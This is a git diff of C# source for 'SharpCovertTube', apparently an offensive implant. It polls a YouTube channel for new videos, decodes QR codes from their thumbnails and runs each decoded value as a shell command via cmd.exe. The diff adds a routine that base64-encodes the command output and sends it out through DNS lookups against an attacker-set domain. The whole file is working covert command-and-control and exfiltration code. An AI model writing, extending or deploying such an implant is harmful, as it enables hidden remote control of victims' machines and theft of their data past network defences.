@@ -5,12 +5,98 @@ using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Net;
+using System.Security.Cryptography;
 using ZXing;
 
 namespace SharpCovertTube
 {
     internal class Program
     {
+        // FILL VALUES
+        public const string channel_id = "";
+        public const string api_key = "";
+        public const string dns_hostname = ".test.org";
+        public const int seconds_delay = 60;
+
+
+        public static string Base64Encode(string plainText)
+        {
+            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
+            return System.Convert.ToBase64String(plainTextBytes);
+        }
+
+
+        // Source: https://blog.dotnetframework.org/2020/02/26/read-a-qr-code-in-c-using-the-zxing-net-library/
+        static string ReadQR(string thumbnail_url)
+        {
+            var client = new WebClient();
+            var stream = client.OpenRead(thumbnail_url);
+            if (stream == null) return "";
+            var bitmap = new Bitmap(stream);
+            IBarcodeReader reader = new BarcodeReader();
+            var result = reader.Decode(bitmap);
+            string decoded_cmd = result.Text;
+            return decoded_cmd;
+        }
+
+        // Source: MSDN
+        static string ExecuteCommand(string command)
+        {
+            string output = "";
+            using (Process process = new Process())
+            {
+                process.StartInfo.FileName = "cmd.exe";
+                process.StartInfo.Arguments = "/c " + command;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.RedirectStandardOutput = true;
+                process.Start();
+                StreamReader reader2 = process.StandardOutput;
+                output = reader2.ReadToEnd();
+                process.WaitForExit();
+            }
+            return output;
+        }
+
+
+        static void DNSExfil(string response_cmd) {
+            // Base64
+            string base64_response_cmd = Base64Encode(response_cmd);
+            Console.WriteLine("[+] Base64 response:\t{0}", base64_response_cmd);
+
+            // DNS lookup
+            try
+            {
+                string exfil_hostname = base64_response_cmd + dns_hostname;
+                exfil_hostname.Trim();
+                exfil_hostname = exfil_hostname.Replace("=", "");
+                Console.WriteLine("[+] DNS lookup against:\t\t{0}", exfil_hostname);
+                Dns.GetHostAddresses(exfil_hostname);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("[-] Exception: {0}", e.ToString());
+            }
+        }
+
+
+        static void ReadVideo(string video_id, string channel_url)
+        {
+            Console.WriteLine("[+] Reading video with ID {0}", video_id);
+            string thumbnail_url = "https://i.ytimg.com/vi/" + video_id + "/hqdefault.jpg";
+            
+            // Read QR
+            string decoded_cmd = ReadQR(thumbnail_url);
+            Console.WriteLine("[+] Value decoded from QR:\t{0}", decoded_cmd);
+            
+            // Execute command
+            string response_cmd = ExecuteCommand(decoded_cmd);
+            Console.WriteLine("[+] Response from command:\t{0}", response_cmd);
+
+            // Exfiltrate
+            DNSExfil(response_cmd);
+        }
+
+
         static string getRequest(string url) {
             WebRequest wrGETURL = WebRequest.Create(url);
             Stream objStream = wrGETURL.GetResponse().GetResponseStream();
@@ -26,6 +112,7 @@ namespace SharpCovertTube
 
             return json_response_str;
         }
+
 
         static List<string> GetVideoIds(string channel_url)
         {
@@ -60,7 +147,7 @@ namespace SharpCovertTube
 
                 // Get list of videos
                 List<string> VideoIds = GetVideoIds(channel_url);
-                // New videos
+                // If new videos -> Read
                 if (VideoIds.Count > number_of_videos)
                 {
                     Console.WriteLine("[+] New videos uploaded!");
@@ -69,7 +156,7 @@ namespace SharpCovertTube
                     foreach (var video_id in firstNotSecond)
                     {
                         Console.WriteLine("[+] New ID: \t{0}", video_id);
-                        DownloadVideo(video_id, channel_url);
+                        ReadVideo(video_id, channel_url);
                     }
 
                     number_of_videos = VideoIds.Count;
@@ -84,97 +171,10 @@ namespace SharpCovertTube
         }
 
 
-        public static string RandomString(int length)
-        {
-            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-            Random random = new Random();
-            return new string(Enumerable.Repeat(chars, length)
-                .Select(s => s[random.Next(s.Length)]).ToArray());
-        }
-
-
-        static string ReadQR(string thumbnail_url) {
-            var client = new WebClient();
-            var stream = client.OpenRead(thumbnail_url);
-            if (stream == null) return "";
-            var bitmap = new Bitmap(stream);
-            IBarcodeReader reader = new BarcodeReader();
-            var result = reader.Decode(bitmap);
-            string decoded_cmd = result.Text;
-            return decoded_cmd;
-        }
-
-
-        static string ExecuteCommand(string command) {
-            string output = "";
-            using (Process process = new Process())
-            {
-                process.StartInfo.FileName = "cmd.exe";
-                process.StartInfo.Arguments = "/c " + command;
-                process.StartInfo.UseShellExecute = false;
-                process.StartInfo.RedirectStandardOutput = true;
-                process.Start();
-
-                // Synchronously read the standard output of the spawned process.
-                StreamReader reader2 = process.StandardOutput;
-                output = reader2.ReadToEnd();
-
-                process.WaitForExit();
-            }
-            return output;
-        }
-
-
-        static void DownloadVideo(string video_id, string channel_url) {
-            /*
-            // Check for new thumbnails
-            string json_response_str = getRequest(channel_url);
-
-            var deserialized = JSONSerializer<APIInfo>.DeSerialize(json_response_str);
-            foreach (Item item in deserialized.items)
-            {
-                Console.WriteLine("[+] VideoId: \t{0}", item.id.videoId);
-                Console.WriteLine("[+] Thumbnail: \t{0}", item.snippet.thumbnails.high.url);
-                if (item.id.videoId == video_id) {
-                    string thumbnail = item.snippet.thumbnails.high.url;
-                    Console.WriteLine("[+] Downloading {0} from {1}", video_id, thumbnail);
-                    DownloadThumbnail(thumbnail);
-                }
-            }
-            */
-
-            /*
-            // Download QR code from thumbnail
-            using (WebClient client = new WebClient())
-            {
-                string rand_name = @"c:\windows\temp\" + RandomString(10) + ".jpg";
-                Console.WriteLine("[+] Downloading {0} to path {1}", thumbnail_url, rand_name);
-                client.DownloadFile(new Uri(thumbnail_url), rand_name);
-            }
-            */
-
-            Console.WriteLine("[+] Reading video with ID {0}", video_id);
-            string thumbnail_url = "https://i.ytimg.com/vi/" + video_id + "/hqdefault.jpg";
-            // Read QR
-            string decoded_cmd = ReadQR(thumbnail_url);
-            Console.WriteLine("[+] Value decoded from QR:\t{0}", decoded_cmd);
-            // Execute command
-            string response_cmd = ExecuteCommand(decoded_cmd);
-            Console.WriteLine("[+] Response from command:\t{0}", response_cmd);
-        }
-
-
         static void Main(string[] args)
         {
-            // FILL VALUES
-            string channel_id = "";
-            string api_key = "";
-            int seconds_delay = 60;
-
-            string base_search_url = "https://www.googleapis.com/youtube/v3/search?";
-            string channel_url = base_search_url + "part=snippet&channelId=" + channel_id + "&maxResults=100&order=date&type=video&key=" + api_key;
+            string channel_url = "https://www.googleapis.com/youtube/v3/search?" + "part=snippet&channelId=" + channel_id + "&maxResults=100&order=date&type=video&key=" + api_key;
             Console.WriteLine("[+] URL to test for file upload: {0}", channel_url);
-
             MonitorChannel(channel_url, seconds_delay);
         }
     }
